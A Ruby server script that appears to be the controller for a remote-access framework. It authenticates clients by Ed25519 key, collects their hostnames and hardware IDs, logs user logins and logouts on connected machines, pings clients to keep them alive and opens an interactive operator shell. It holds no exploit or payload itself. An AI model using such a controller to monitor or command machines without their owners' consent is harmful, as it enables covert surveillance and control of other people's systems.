require_relative("src/services.rb")
require_relative("src/shell.rb")

PORT     = (ARGV[0] || 32435).to_i
KEYS_DIR = File.join(__dir__, "keys")

# Load server Ed25519 identity
server_key_path = File.join(KEYS_DIR, "server.key")
unless File.exist?(server_key_path)
  abort "No server key found at #{server_key_path}\nRun: ruby keys/generate.rb"
end
SERVER_IDENTITY = OpenSSL::PKey.new_raw_private_key("ED25519", [File.read(server_key_path).strip].pack("H*"))
puts "[*] Server identity: #{SERVER_IDENTITY.raw_public_key.unpack1('H*')[0, 16]}..."

# Load authorized client public keys
AUTHORIZED_CLIENTS = Dir.glob(File.join(KEYS_DIR, "authorized_clients", "*.pub")).map do |f|
  [File.read(f).strip].pack("H*").b
end
puts "[*] Authorized clients: #{AUTHORIZED_CLIENTS.size}"

server = ProtocolServer.new(PORT)
server.transport.identity_key = SERVER_IDENTITY
server.transport.authorized_client_keys = AUTHORIZED_CLIENTS
shell  = Shell.new(server)

# ── connection lifecycle ────────────────────────────────────────────────────

server.on("_connect") do |clientId, srv, _env|
  srv.clients[clientId][:last_pong] = Time.now
  hostInfo = srv.clients[clientId][:host].join(":")
  say "[+] Connection from #{hostInfo} -> #{clientId}"
end

server.on("_disconnect") do |clientId, srv, env|
  say "[-] #{clientId[0,8]} disconnected"
  shell.on_client_disconnect(clientId)
end

# First event sent by a new client. Stores system info for `who` / `info`.
server.on("stablish") do |clientId, srv, env|
  srv.clients[clientId][:sysinfo] = env.payload
  srv.clients[clientId][:last_pong] = Time.now
  srv.clients[clientId][:connected_at] = Time.now
  hwid     = (env.payload[:hwid]     rescue "unknown")
  hostname = (env.payload[:hostname] rescue "unknown")
  say "[*] Established #{clientId[0,8]} (#{hostname}, HWID: #{hwid.to_s[0,12]}…)"
end

# ── keepalive ────────────────────────────────────────────────────────────────

server.on("pong") do |clientId, srv, _env|
  c = srv.clients[clientId]
  if c
    now = Time.now
    c[:last_pong] = now
    c[:latency_ms] = ((now - c[:ping_sent]) * 1000).round(1) if c[:ping_sent]
  end
end

# ── user login/logout events from client monitors ───────────────────────────

server.on("user_login") do |clientId, srv, env|
  hostname = srv.clients.dig(clientId, :sysinfo, :hostname) || clientId[0,8]
  user = (env.payload[:user] rescue "?")
  tty  = (env.payload[:tty]  rescue "?")
  say "\e[32m[+user]\e[0m #{user} logged in on #{hostname} (#{tty})"
end

server.on("user_logout") do |clientId, srv, env|
  hostname = srv.clients.dig(clientId, :sysinfo, :hostname) || clientId[0,8]
  user = (env.payload[:user] rescue "?")
  tty  = (env.payload[:tty]  rescue "?")
  say "\e[31m[-user]\e[0m #{user} logged out from #{hostname} (#{tty})"
end

# ── keepalive thread ─────────────────────────────────────────────────────────

Thread.new do
  loop do
    sleep 25
    now = Time.now
    ids = server.clients.keys.dup
    ids.each do |id|
      client = server.clients[id]
      next unless client && client[:alive]
      client[:last_pong] ||= now
      if now - client[:last_pong] > 75
        say "[!] #{id[0,8]} timed out (no pong in 75s)"
        server.disconnect(id)
        next
      end
      client[:ping_sent] = now
      server.send_event(id, "ping")
    end
  rescue => e
    # Don't crash the keepalive thread
  end
end

# ── start server + interactive shell ────────────────────────────────────

Thread.new { server.start }
shell.run
